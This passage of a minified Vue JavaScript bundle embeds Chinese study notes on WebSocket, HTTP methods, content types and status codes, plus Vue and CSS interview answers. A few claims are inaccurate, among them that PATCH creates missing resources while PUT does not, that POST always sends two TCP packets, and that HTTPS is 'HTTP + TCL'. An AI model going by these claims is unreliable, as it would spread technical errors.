连接已经关闭，或者连接无法建立；\r\n\r\n\t\t\t- WebSocket 的实例对象中提供了 readyState 属性来判断当前状态；\r\n\r\n\t\t- （4）实例化对象中可以监听到以下事件：\r\n\r\n\t\t\t- open 连接打开的回调事件，这时 readyState 变为 OPEN；\r\n\t\t\t- message 收到消息的回调事件，同时回调函数接收到一个 MessageEvent 数据；\r\n\t\t\t- close 连接关闭的回调事件，这时 readyState 变为 CLOSED；\r\n\t\t\t- error 建立与连接过程发生错误的回调事件；\r\n\r\n\t- 具体代码\r\n\r\n\t- 控制台中可以看到：\r\n\r\n\t\t- 首先触发 open 事件，之后每次发送数据服务端都会回复数据，因此触发了 message 事件，当发送 10 次之后浏览器主动断开连接，因此触发 close 事件；这里最后一次发送之后未收到服务端回复也是因为客户端立即断开了连接；\r\n\r\n- 事件与数据\r\n\r\n\t- 对 WebSocket 实例监听事件有两种方式，这里以 message 事件为例：\r\n\r\n\t\t- 对 onmessage 属性直接赋值，正如以上：ws.onmessage = function () {};；\r\n\t\t- 使用 addEventListener 监听事件，如：ws.addEventListener('message', function () {})；\r\n\r\n\t- 在 message 回调函数中得到 MessageEvent 类型参数 e ，我们需要的数据可以通过 e.data 获取；\r\n\t- 需要注意的一点是：\r\n\r\n\t\t- 不论服务端与客户端，其接受到的数据都是序列化后的字符串（当然也有 ArrayBuffer|Blob 类型数据），很多时候我们需要解析处理数据，比如 JSON.parse(e.data)；\r\n\r\n- 连接稳定性\r\n\r\n\t- 由于网络环境复杂，某些情况会出现断开连接或者连接出错，需要我们在 close 或者 error 事件中监听非正常断开并重连；\r\n\t- 由于一些原因在 error 时浏览器并不会响应回调事件，因此稳妥的做法还需要在 open 之后开启一个定时任务去判断当前的连接状态 readyState ，在出现异常情况下尝试重连；\r\n\r\n- 心跳\r\n\r\n\t- websocket规范定义了心跳机制，一方可以通过发送ping（opcode 0x9）消息给另一方，另一方收到ping后应该尽可能快的返回pong（0xA）。\r\n\t- 心跳机制是用于检测连接的对方在线状态，因此如果没有心跳，那么无法判断一方还在连接状态中，一些网络层比如 nginx 或者浏览器层会主动断开连接，\r\n\t- 在 JavaScript 中，WebSocket 并没有开放 ping/pong 的 API ，虽然浏览器自带了心跳处理，然而不同厂商的实现也不尽相同，因此需要在我们开发时候与服务端约定好一个自实现的心跳机制；\r\n\t- 比如浏览器中，检测到 open 事件后，启动一个定时任务，每次发送数据 0x9 给服务端，而服务端返回 0xA 作为响应；\r\n\t- 实践下来，心跳的定时任务一般是相隔 15-20 秒发送一次。\r\n\r\n### （4）网络协议\r\n\r\n- WebSocket与网络协议的关系\r\n\r\n\t- 前文说到，Websocket 是建立与 TCP 之上，那么其与 HTTP 协议有和关系呢？\r\n\t- Websocket 连接分为建连阶段与连接阶段，在建立连接阶段借助于 HTTP ，而在连接阶段则与 HTTP 无关。\r\n\r\n- 建立连接阶段\r\n\r\n\t- 从浏览器的 Network 中，找到 ws 连接，可以看到：\r\n\r\n\t- 这是一个标准的 HTTP 请求，相比于我们常见的 HTTP 请求协议，请求头中多了几个字段：\r\n\r\n\t\t- Connection 为 Upgrade ，Upgrade 为 websocket ，表示告知 Nginx 与 Apache 等服务器该次连接并非为 HTTP 连接，实质上是一个 websocket ，因此服务器会转发到相应的 websocket 任务处理；\r\n\t\t- Sec-WebSocket-Key 是一个 Base64 encode 的值，由浏览器随机生成的，用于验证服务器连接的正确性；\r\n\t\t- Sec-WebSocket-Versio 表示为使用的 websocket 服务版本；\r\n\r\n\t- 响应头中：\r\n\r\n\t\t- 可以看到其返回状态码为 101 ，表示切换协议；\r\n\t\t- Upgrade 与 Connection 用于回复客户端表示已经切换协议成功；\r\n\t\t- Sec-WebSocket-Accept 字段与 Sec-WebSocket-Key 相对应，用于验证服务的正确性；\r\n\r\n- 连接阶段\r\n\r\n\t- 当通过 HTTP 建立连接握手后，接下来则是真正的 Websocket 连接了，其基于 TCP 收发数据，Websocket 封装并开放接口。\r\n\r\n- WSS\r\n\r\n\t- 在 HTTP 协议中，很多时候为了加密与安全需要使用 HTTPS 请求（HTTP + TCL）；相应的，在 Websocket 协议中，也是可以使用加密传输的 —— wss ，比如 wss://localhost:8080。\r\n\t- 使用的也是与 HTTPS 一样的证书，在这里一般是交由 Nginx 等服务层去做证书处理。\r\n\r\n",$t={data:function(){return{MainComponent:Wt}}},Gt=$t,Vt=Object(u["a"])(Gt,Jt,zt,!1,null,"386b2e07",null),Qt=Vt.exports,Kt=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Xt=[],Yt="# 前后端通信\r\n\r\n## 常用请求方法\r\n\r\n### HTTP 0.9\r\n\r\n- GET\r\n\r\n### HTTP1.0\r\n\r\n- POST\r\n- HEAD\r\n\r\n\t- 描述\r\n\r\n\t\t- HEAD方法和GET方法一样，知识不返回豹纹的主体部分，用于确认URI的有效性及资源更新的日期时间等。\r\n\r\n\t- 具体\r\n\r\n\t\t- （1）可以在不获取资源的情况下很快地就能了解到资源的情况，比如其类型，其文件大小，\r\n\t\t- （2）也可以通过响应码查看是否存在该资源，\r\n\t\t- （3）也可以检测资源是否被修改了。\r\n\r\n\t- HEAD方法和GET方法的区别： GET方法有实体，HEAD方法无实体。\r\n\r\n### HTTP1.1\r\n\r\n- PUT\r\n\r\n\t- 描述\r\n\r\n\t\t- PUT方法用来传输文件，就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存在请求URI指定的位置。但是HTTP/1.1的PUT方法自身不带验证机制，任何人都可以上传文件，存在安全问题，故一般不用。\r\n\r\n\t- 什么时候用POST或PUT？\r\n\r\n\t\t- 取决于这个REST服务的行为是否是idempotent（等幂）的（一个方法重复执行多次，产生的效果是一样的）\r\n\t\t- 假如我们发送两个http://superblogging/blogs/post/Sample请求，服务器端是什么样的行为？如果产生了两个博客帖子，那就说明这个服务不是idempotent的，因为多次使用产生了副作用了嘛；如果后一个请求把第一个请求覆盖掉了，那这个服务就是idempotent的。前一种情况，应该使用POST方法，后一种情况，应该使用PUT方法。\r\n\r\n- DELETE\r\n\r\n\t- 描述\r\n\r\n\t\t-  指明客户端想让服务器删除某个资源，与PUT方法相反，按URI删除指定资源\r\n\r\n\t- 响应\r\n\r\n\t\t- （1）如果响应里包含描述成功的实体，响应应该是200（Ok）\r\n\t\t- （2）如果DELETE动作没有通过，应该以202（已接受）响应\r\n\t\t- （3）如果DELETE方法请求已经通过了，但响应不包含实体，那么应该以204（无内容）响应。\r\n\r\n- CONNECT\r\n\r\n\t- 描述\r\n\r\n\t\t- \r\nCONNECT方法是HTTP/1.1协议预留的，能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接与非加密的HTTP代理服务器的通信。\r\n\r\n- OPTIONS\r\n\r\n\t- 描述\r\n\r\n\t\t- OPTIONS 方法请求 Web 服务器告知其支持的各种功能。可以询问服务器通常支持哪些方法，或者对某些特殊资源支持哪些方法。(有些服务器可能只支持对一些特殊类型的对象使用特定的操作)。\r\n\t\t- 通过使用 OPTIONS，客户端可以在与服务器进行交互之前，确定服务器的能力，这样它就可以更方便地与具备不同特性的代理和服务器进行互操作了。\r\n\t\t- 这为客户端应用程序提供了一种手段，使其不用实际访问那些资源就能判定访问各种资源的最优方式。\r\n\r\n- TRACE\r\n\r\n\t- 描述\r\n\r\n\t\t- \r\nTRACE请求服务器回显其收到的请求信息，该方法主要用于HTTP请求的测试或诊断。\r\n\t\t- TRACE 响应的 Content-Type 为 message/http，状态为 200 OK。\r\n\r\n\t- 原理\r\n\r\n\t\t- \r\nTRACE 请求会在目的服务器端发起一个 环回 诊断。行程最后一站的服务器会弹回一条 TRACE 响应，并在响应主体中携带它收到的原始请求报文。这样客户端就可以查看在所有中间 HTTP 应用程序组成的请求 / 响应链上，原始报文是否，以及如何被毁坏或修改过。\r\n\r\n### HTTP1.1 扩展\r\n\r\n- PATCH\r\n\r\n\t- 描述\r\n\r\n\t\t- PATCH请求与PUT请求类似，同样用于资源的更新。二者有以下两点不同：\r\n\r\n\t\t\t- PATCH一般用于资源的部分更新，而PUT一般用于资源的整体更新。\r\n\t\t\t- 当资源不存在时，PATCH会创建一个新的资源，而PUT只会对已在资源进行更新。\r\n\r\n## GET、POST方法区别\r\n\r\n### （1）GET在浏览器回退时是无害的，而POST会再次提交请求。\r\n\r\n### （2）GET产生的URL地址可以被Bookmark，而POST不可以。\r\n\r\n### （3）GET请求会被浏览器主动cache，而POST不会，除非手动设置。\r\n\r\n### （4）GET请求只能进行url编码，而POST支持多种编码方式。\r\n\r\n### （5）GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。\r\n\r\n### （6）GET请求在URL中传送的参数是有长度限制的，而POST么有。\r\n\r\n### （7）对参数的数据类型，GET只接受ASCII字符，而POST没有限制。\r\n\r\n### （8）GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。\r\n\r\n### （9）GET参数通过URL传递，POST放在Request body中。\r\n\r\n### （10）GET产生一个TCP数据包；POST产生两个TCP数据包。\r\n\r\n- 对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；\r\n- 而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。\r\n\r\n## 常用content-type类型\r\n\r\n### （1）application/x-www-form-urlencoded \r\n\r\n- 描述\r\n\r\n\t- 1）浏览器的原生form表单\r\n\t- 2） 提交的数据按照 key1=val1&key2=val2 的方式进行编码，key和val都进行了URL转码\r\n\r\n- 具体\r\n\r\n### （2）multipart/form-data\r\n\r\n- 描述\r\n\r\n\t- 主要用于上传文件。（使用表单上传文件时，必须让 form 的 enctype 等于这个值。）\r\n\r\n首先生成一个 boundary 用于分割不同的字段，为了避免与正文内容重复，boundary 很长很复杂。\r\n\r\n\t- 消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 --boundary 开始，紧接着是内容描述信息，然后是回车，最后是字段具体内容（文本或二进制）。\r\n\t- 如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 --boundary-- 标示结束。\r\n\r\n- 具体\r\n\r\n### （3）application/json\r\n\r\n- 描述\r\n\r\n\t- Json格式⽀支持比键值对复杂地多的数据，适合restful的接⼝口。\r\n\r\n- 具体\r\n\r\n### （4）text/html、text/plain、text/xml\r\n\r\n- HTML格式、纯文本格式、XML格式\r\n\r\n## 常见状态码含义\r\n\r\n### 1xx\r\n\r\n- 100（Continue/继续）\r\n\r\n\t- 请求者应当继续提出请求。服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。\r\n\r\n- 101（Switching Protocols/切换协议）\r\n\r\n\t- 请求者已要求服务器切换协议，服务器已确认并准备切换。主要用于websocket，也可以用于http2的升级。\r\n\r\n### 2xx\r\n\r\n- 200（OK/正常）\r\n\r\n\t- 服务器已经成功处理了请求。通常，这表示服务器提供了请求的网页。\r\n\r\n- 201（Created/已创建）\r\n\r\n\t- 请求成功并且服务器创建了新的资源\r\n\r\n- 202（Accepted/已接受）\r\n\r\n\t- 服务器已接受请求，但尚未处理\r\n\r\n- 203 (Non-Authoritative Information/非官方信息)\r\n\r\n\t- 服务器已经成功处理了请求，但返回的信息可能来自另一来源\r\n\r\n- 204（NO Content/无内容）\r\n\r\n\t- 服务器成功处理了请求，但没有返回任何内容\r\n\r\n- 205 (Reset Content/重置内容)\r\n\r\n\t- 服务器成功处理了请求，但没有返回任何内容\r\n\r\n- 206 (Partial Content/局部内容)\r\n\r\n\t- 该状态码表示客户端进行了请求，请求资源的某一部分，而服务器成功执行了这部分的 GET 请求，响应报文中包含由 Content-Range 指定范围的实体内容\r\n\r\n### 3xx\r\n\r\n- 300（Multiple Choices/多重选择）\r\n\r\n\t-  针对请求，服务器可执行多种操作。服务器可根据请求者（user agent）选择一项操作，或提供操作列表供请求者选择。\r\n\r\n- 301（Moved Permanently/永久重定向）\r\n\r\n\t- 永久性重定向\r\n\r\n- 302（Found/临时重定向）\r\n\r\n\t- 临时性重定向\r\n\r\n- 303 （See Other/参见其他信息）\r\n\r\n\t- 该状态码表示由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。\r\n\t- 303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。 \r\n\r\n- 304（Not Modified/未修改）\r\n\r\n\t- 自动上次请求后，请求的网页未修改过。服务器返回此响应，不会返回网页的内容（协商缓存）\r\n\r\n- 305（Use Proxy/使用代理）\r\n\r\n\t- 请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理\r\n\r\n- 307（Temporary Redirect /临时重定向）\r\n\r\n\t- 用于HSTS跳转。全称HTTP严格传输安全（HTTP Strict Transport Security，縮寫：HSTS）。功能是要求浏览器下次访问该站点时使用HTTPS来访问，而不再需要先是HTTP再转HTTPS。这样可以避免SSL剥离攻击，具体使用方法是在服务器响应头中添加 Strict-Transport-Security，可以设置 max-age\r\n\t- SSL剥离攻击（攻击HTTPS）\r\n\r\n\t\t- 描述\r\n\r\n\t\t\t- 即攻击者在用户使用http访问的过程中进行攻击，对服务器冒充自己是用户，在攻击者和服务器中使用https访问，在用户和服务器中使用http访问。\r\n\r\n\t\t- 另一种攻击号称安全的HTTPS的方法是：SSL挟持\r\n\r\n\t\t\t- 大概就是信任第三方的安全证书，这点被利用于代理软件监听https。\r\n\r\n### 4xx\r\n\r\n- 400（Bad Request/错误请求）\r\n\r\n\t- 服务器不理解请求的语法\r\n\r\n- 401（Unauthorized/未验证）\r\n\r\n\t- 请求要求身份验证。对于需要登录的网页，服务器可能返回此响应\r\n\r\n- 403（Forbidden/禁止）\r\n\r\n\t- 没有权限请求，表示除非拥有授权，否则服务器拒绝提供所请求的资源。\r\n\r\n- 404（Not Found/未找到）\r\n\r\n\t- 服务器找不到请求的网页\r\n\r\n- 405 (Method Not Allowed/方法未允许)\r\n\r\n\t- 禁用请求中指定的方法\r\n\r\n- 406 (Not Acceptable/无法访问)\r\n\r\n\t- 表示请求资源的MIME类型与客户端中Accept头信息中指定的类型不一致，无法使用请求的内容特性响应请求的网页\r\n\r\n- 407 (Proxy Authentication Required/代理服务器认证要求)\r\n\r\n\t- 与401状态有些相似，只是这个状态用于代理服务器。该状态指出客户端必须通过代理服务器的认证。代理服务器返回一个Proxy-Authenticate响应头信息给客户端，这会引起客户端使用带有Proxy-Authorization请求的头信息重新连接。\r\n\r\n- 408 (Request Timeout/请求超时)\r\n\r\n\t- 是指服务端等待客户端发送请求的时间过长。\r\n\r\n- 409 (Conflict/冲突)：\r\n\r\n\t- 该状态通常与PUT请求一同使用，常被用于试图上传版本不正确的文件时。\r\n\r\n- 410 (Gone/已经不存在)\r\n\r\n\t- 告诉客户端所请求的文档已经不存在并且没有更新的地址。410状态不同于404，410是在指导文档已被移走的情况下使用，而404则用于未知原因的无法访问。\r\n\r\n- 411 (Length Required/需要数据长度)\r\n\r\n\t- 服务器不接受不含有效内容长度标头字段的请求，除非客户端发送Content-Length头信息指出发送给服务器的数据的大小。\r\n\r\n- 412 (Precondition Failed/未满足前提条件)\r\n\r\n\t- 服务器未满足请求者在请求者设置的其中一个前提条件\r\n\r\n- 413 (Request Entity Too Large/请求实体过大)\r\n\r\n\t- 服务器无法处理请求，因为请求实体过大，超出了服务器的处理能力\r\n\r\n- 414 (Request URI Too Long/请求URI过长)\r\n\r\n\t- 请求的URI（通常为网址）过长，服务器无法处理\r\n\r\n- 415 (Unsupported Media Type/不支持的媒体类型)\r\n\r\n\t- 请求的格式不受请求页面的支持\r\n\r\n- 416 (Requested Range Not Satisfiable/请求范围无法满足)\r\n\r\n\t- 表示客户端包含了一个服务器无法满足的Range头信息的请求，如果页面无法提供请求的范围，则服务器会返回此状态码\r\n\r\n- 417 (Expectation Failed/期望失败)\r\n\r\n\t- 如果服务器得到一个带有100-continue值的Expect请求头信息，这是指客户端正在询问是否可以在后面的请求中发送附件。在这种情况下，服务器也会用该状态(417)告诉浏览器服务器不接收该附件或用100 (SC_CONTINUE)状态告诉客户端可以继续发送附件\r\n\r\n### 5xx\r\n\r\n- 500 (Internal Server Error/服务器内部错误)\r\n\r\n\t- 服务器遇到错误，无法完成请求\r\n\r\n- 501 (Not Implemented/未实现)\r\n\r\n\t- 服务器不具备完成此请求中要求的功能。例如，服务器无法识别请求方法时可能会返回此代码，或者客户端执行了如PUT这样的服务器并不支持的命令。\r\n\r\n- 502 (Bad Gateway/错误的网关)\r\n\r\n\t- 服务器作为网关或代理，从上游服务器无法收到无效响应\r\n\r\n- 503 (Service Unavailable/服务器不可用)\r\n\r\n\t- 服务器目前无法使用（由于超载或者停机维护）。通常，这只是暂时状态\r\n\r\n- 504 (Gateway Timeout/网关超时)\r\n\r\n\t- 服务器作为网关代理，但是没有及时从上游服务器收到请求\r\n\r\n- 505 (HTTP Version Not Supported/不支持的 HTTP 版本)\r\n\r\n\t- 服务器并不支持在请求中所标明 HTTP 版本\r\n\r\n",Zt={data:function(){return{MainComponent:Yt}}},ne=Zt,re=Object(u["a"])(ne,Kt,Xt,!1,null,"05cbc232",null),te=re.exports,ee=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},ae=[],ie={},se=ie,oe=Object(u["a"])(se,ee,ae,!1,null,"0742bb52",null),le=oe.exports,ce=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},pe=[],ue={},me=ue,de=Object(u["a"])(me,ce,pe,!1,null,"4562bada",null),ge=de.exports,be=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},ve=[],he={},Se=he,ye=Object(u["a"])(Se,be,ve,!1,null,"994aec58",null),fe=ye.exports,_e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},xe=[],we={},Ee=we,Te=Object(u["a"])(Ee,_e,xe,!1,null,"ed331dd6",null),ke=Te.exports,Ce=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},je=[],Me={},Re=Me,Le=Object(u["a"])(Re,Ce,je,!1,null,"5f725856",null),Oe=Le.exports,Ae=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},Ie=[],De={},Pe=De,Ne=Object(u["a"])(Pe,Ae,Ie,!1,null,"357e3f97",null),qe=Ne.exports,He={mixins:[xn["a"]],components:{m1:Qt,m2:te,m3:le,m4:ge,m5:fe,m6:ke,m7:Oe,m8:qe},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"http基本",value:"m1"},{label:"前后端通信",value:"m2"}]}}},Be=He,Fe=Object(u["a"])(Be,Ft,Ut,!1,null,"04827b09",null),Ue=Fe.exports,Je=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"q-mx-lg"},[t(""+n.tab,{tag:"component"})],1)])},ze=[],We=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},$e=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",[t("a",{attrs:{href:"https://blog.csdn.net/aSuncat/article/details/88674643",target:"_blank",rel:"noopener noreferrer"}},[n._v("https://blog.csdn.net/aSuncat/article/details/88674643")]),t("br"),t("a",{attrs:{href:"https://www.cnblogs.com/chenwenhao/p/11258895.html",target:"_blank",rel:"noopener noreferrer"}},[n._v("https://www.cnblogs.com/chenwenhao/p/11258895.html")])]),t("div",{staticClass:"htmledit_views"},[t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("1、")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("v-model是什么？ vue中标签怎么绑定事件？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("答：")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("v-model这个指令只能用在表单元素上，可以用他进行双向数据绑定。")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("<input @click=doLog() />")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[n._v("2"),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("mvvm框架是什么？")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("说说对双向数据绑定的理解？")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("jquery）的区别是什么？哪些场景适合？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("mvvm")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("的")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("m")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("v经过数据改变后的html、")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vm")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("就是")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("连接数据和视图，")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("用来实现双向绑定")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(":一个变了另外一个跟着变了，例如：视图一个绑定了模型的节点有变化，模型对应的值会跟着变")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue数据驱动，通过数据来显示视图层而不是节点操作。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("场景：数据操作比较多的场景，更加便捷")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("3、自定义指令")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("vue对象的directive方法里面有两个参数，一个是指令名称，另外一个是函数。组件内定义指令（局部定义指令）：directives")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("bind（绑定事件触发）、inserted(节点插入的时候触发)、update（组件内相关更新）、")]),t("span",{staticStyle:{color:"rgb(85,85,85)"}},[n._v("componentUpdated")]),t("span",{staticStyle:{color:"rgb(85,85,85)"}},[n._v("（")]),t("span",{staticStyle:{color:"rgb(85,85,85)"}},[n._v("被绑定元素所在模板完成一次更新周期时调用")]),t("span",{staticStyle:{color:"rgb(85,85,85)"}},[n._v("）、")]),t("span",{staticStyle:{color:"rgb(85,85,85)"}},[n._v("unbind")]),t("span",{staticStyle:{color:"rgb(85,85,85)"}},[n._v("（")]),t("span",{staticStyle:{color:"rgb(85,85,85)"}},[n._v("只调用一次，指令与元素解绑时调用")]),t("span",{staticStyle:{color:"rgb(85,85,85)"}},[n._v("）")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("el、binding")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("4、")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("4种vue当中的指令和它的用法？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("答：")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("v-if：判断是否隐藏；v-for：数据循环出来；v-bind:class：绑定一个属性；v-model：实现双向绑定")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("5、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("vue生命周期的理解？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("8个阶段创建前/后，载入前/后，更新前/后，销毁前/后。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("/后：\n        在beforeCreated阶段，vue实例的挂载元素$el和数据对象data都为undefined，还未初始化。在created阶段，vue实例的数据对象data有了，$el还没有。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("/后：在beforeMount阶段，vue实例的$el和data都初始化了，但还是挂载之前为虚拟的dom节点，data.message还未替换。在mounted阶段，vue实例挂载完成，data.message成功渲染。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("/后：当data变化时，会触发beforeUpdate和updated方法。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("/后：在执行destroy方法后，对data的改变不会再触发周期函数，说明此时vue实例已经解除了事件监听以及和dom的绑定，但是dom结构依然存在")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("6、")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("\n          vue 组件")]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("答：首先，组件可以提升整个项目的开发效率。能够把页面抽象成多个相对独立的模块，解决了我们传统项目开发：效率低、难维护、复用性等问题。")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("使用")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("Vue")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v(".component")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("方法注册组件。子组件需要数据，可以在")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("props")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("中接受定义。而子组件修改好数据后，想把数据传递给父组件。可以采用")]),t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("emit")])]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("方法。")])]),t("p",[t("strong",[n._v("7、"),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("Vue.js内置的指令，用什么开头？")])])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("v-开头的")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[n._v("8、CSS隐藏元素的几种方法？说出他们的区别")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}}),t("p",{staticStyle:{background:"rgb(255,255,255)"}}),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("\n      opacity:0 透明度为0，占物理位置\n    ")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}}),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("\n      9、"),t("strong",[n._v("CSS清除浮动的几种方法（至少两种）")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("clear属性的空元素")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("CSS的overflow属性；")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("\n      CSS的:after伪元素"),t("span",{staticStyle:{color:"rgb(44,44,44)"}}),n._v("；\n    ")]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[n._v("10、例举3种强制类型转换?")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[n._v("parseInt,parseFloat,number")]),t("h4",[t("strong",[n._v("11、")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("pop")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("()")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("push")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("shift")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("()")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}}),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("unshift")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("() ")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("有什么区别")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("?")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}}),t("p",{staticStyle:{background:"rgb(255,255,255)"}}),t("p",{staticStyle:{background:"rgb(255,255,255)"}}),t("p",[n._v("12、"),t("strong",[n._v("提交表单，有几种方式")])]),t("p",[t("span",{staticStyle:{color:"rgb(75,75,75)",background:"rgb(255,255,255)"}},[n._v("submit")]),n._v("提交，"),t("span",{staticStyle:{color:"rgb(75,75,75)",background:"rgb(255,255,255)"}},[n._v("Ajax提交form表单")])]),t("p",[t("strong")]),t("p",[t("strong",[n._v("13、定义一个div，让其在页面中，垂直居中显示")])]),t("p"),t("p"),t("p"),t("p"),t("p"),t("p",[n._v("height:200px;")]),t("p",[n._v("margin-left:-250px;")]),t("p",[n._v("margin-top:-100px;")]),t("p",[n._v("background:red;")]),t("p",[n._v("}")]),t("p"),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("1")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("4")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("active-class是哪个组件的属性？